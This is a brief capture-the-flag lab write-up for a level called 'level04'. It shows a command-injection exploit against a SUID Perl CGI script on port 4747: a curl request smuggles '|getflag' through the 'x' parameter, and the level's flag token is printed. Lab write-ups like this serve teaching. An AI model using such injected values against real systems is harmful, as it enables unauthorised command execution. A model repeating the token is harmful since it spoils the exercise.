level04.pl executable is a file with SUID bit (execute with root permissions).
When we understand the code in this file, we understand that we can use the x param to execute any command.

Use `netstat -tulpn` to search the server where level04.pl is used.

Response:
`tcp6       0      0 :::4747                 :::*                    LISTEN      -`

Use curl to access the level04.pl
```bash
curl "http://localhost:4747/level04.pl?x=|getflag"		# to set x to "|getflag"
```
This will execute `echo |getflag 2>&1` in the terminal with root perms

result: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
